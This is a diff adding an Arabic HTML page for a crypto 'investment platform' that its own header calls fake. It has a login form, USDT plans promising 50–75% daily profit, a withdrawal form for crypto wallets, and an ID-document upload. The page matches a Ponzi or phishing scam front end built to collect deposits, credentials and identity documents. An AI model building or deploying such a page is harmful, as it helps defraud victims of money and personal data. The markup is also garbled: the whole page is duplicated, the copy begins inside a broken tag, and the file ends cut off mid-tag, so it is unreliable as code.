@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Investissement Rentable</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('https://i.ibb.co/G0gHrK2/dollar-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      color: white;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+    }
+    header {
+      background-color: #004d00cc;
+      padding: 1rem;
+      text-align: center;
+      font-size: 1.7rem;
+      font-weight: bold;
+    }
+    main {
+      padding: 2rem;
+      background-color: #000000b0;
+    }
+    .plan {
+      border: 2px solid #00ff00;
+      border-radius: 10px;
+      margin: 1rem 0;
+      padding: 1rem;
+      background-color: #00220099;
+    }
+    h2 {
+      color: #00ff00;
+      border-bottom: 1px solid #00ff00;
+      padding-bottom: 5px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 0.7rem;
+      margin: 0.5rem 0;
+      border-radius: 5px;
+      border: none;
+      font-size: 1rem;
+    }
+    button {
+      background-color: #00ff00;
+      color: black;
+      font-weight: bold;
+    }
+    footer {
+      background-color: #002200;
+      color: white;
+      text-align: center;
+      padding: 1rem;
+      margin-top: 2rem;
+    }
+    a {
+      color: #00ff00;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <header>💸 Investissement Rentable - منصة استثمار وهمية</header>
+  <main>
+    <h2>تسجيل الدخول / إنشاء حساب</h2>
+    <input type="text" placeholder="📱 رقم الهاتف أو 📧 البريد الإلكتروني" />
+    <input type="password" placeholder="🔑 كلمة المرور" />
+    <button>🔐 تسجيل الدخول</button>
+    <button>📝 إنشاء حساب جديد</button>
+    <p><a href="#">هل نسيت كلمة السر؟</a></p>
+
+    <h2>💼 خطط الاستثمار</h2>
+    <div class="plan">💵 3 USDT - ربح يومي: 1.5 USDT</div>
+    <div class="plan">💵 5 USDT - ربح يومي: 2.5 USDT</div>
+    <div class="plan">💵 10 USDT - ربح يومي: 6 USDT</div>
+    <div class="plan">💵 12 USDT - ربح يومي: 8 USDT</div>
+    <div class="plan">💵 20 USDT - ربح يومي: 12 USDT</div>
+    <div class="plan">💵 50 USDT - ربح يومي: 30 USDT</div>
+    <div class="plan">💵 80 USDT - ربح يومي: 60 USDT</div>
+
+    <h2>💳 السحب</h2>
+    <input type="text" placeholder="💰 المبلغ المراد سحبه" />
+    <select>
+      <option>محفظة TRC20</option>
+      <option>محفظة ERC20</option>
+      <option>Binance</option>
+      <option>Trust Wallet</option>
+      <option>OKX</option>
+    </select>
+    <input type="text" placeholder="🔗 عنوان المحفظة" />
+    <button>⏬ طلب السحب</button>
+
+    <h2>🛡️ توثيق الحساب</h2>
+    <input type="file" />
+    <button>📤 رفع وثائق التوثيق</button>
+
+    <h2<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Investissement Rentable</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('https://i.ibb.co/G0gHrK2/dollar-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      color: white;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+    }
+    header {
+      background-color: #004d00cc;
+      padding: 1rem;
+      text-align: center;
+      font-size: 1.7rem;
+      font-weight: bold;
+    }
+    main {
+      padding: 2rem;
+      background-color: #000000b0;
+    }
+    .plan {
+      border: 2px solid #00ff00;
+      border-radius: 10px;
+      margin: 1rem 0;
+      padding: 1rem;
+      background-color: #00220099;
+    }
+    h2 {
+      color: #00ff00;
+      border-bottom: 1px solid #00ff00;
+      padding-bottom: 5px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 0.7rem;
+      margin: 0.5rem 0;
+      border-radius: 5px;
+      border: none;
+      font-size: 1rem;
+    }
+    button {
+      background-color: #00ff00;
+      color: black;
+      font-weight: bold;
+    }
+    footer {
+      background-color: #002200;
+      color: white;
+      text-align: center;
+      padding: 1rem;
+      margin-top: 2rem;
+    }
+    a {
+      color: #00ff00;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <header>💸 Investissement Rentable - منصة استثمار وهمية</header>
+  <main>
+    <h2>تسجيل الدخول / إنشاء حساب</h2>
+    <input type="text" placeholder="📱 رقم الهاتف أو 📧 البريد الإلكتروني" />
+    <input type="password" placeholder="🔑 كلمة المرور" />
+    <button>🔐 تسجيل الدخول</button>
+    <button>📝 إنشاء حساب جديد</button>
+    <p><a href="#">هل نسيت كلمة السر؟</a></p>
+
+    <h2>💼 خطط الاستثمار</h2>
+    <div class="plan">💵 3 USDT - ربح يومي: 1.5 USDT</div>
+    <div class="plan">💵 5 USDT - ربح يومي: 2.5 USDT</div>
+    <div class="plan">💵 10 USDT - ربح يومي: 6 USDT</div>
+    <div class="plan">💵 12 USDT - ربح يومي: 8 USDT</div>
+    <div class="plan">💵 20 USDT - ربح يومي: 12 USDT</div>
+    <div class="plan">💵 50 USDT - ربح يومي: 30 USDT</div>
+    <div class="plan">💵 80 USDT - ربح يومي: 60 USDT</div>
+
+    <h2>💳 السحب</h2>
+    <input type="text" placeholder="💰 المبلغ المراد سحبه" />
+    <select>
+      <option>محفظة TRC20</option>
+      <option>محفظة ERC20</option>
+      <option>Binance</option>
+      <option>Trust Wallet</option>
+      <option>OKX</option>
+    </select>
+    <input type="text" placeholder="🔗 عنوان المحفظة" />
+    <button>⏬ طلب السحب</button>
+
+    <h2>🛡️ توثيق الحساب</h2>
+    <input type="file" />
+    <button>📤 رفع وثائق التوثيق</button>
+
+    <h2
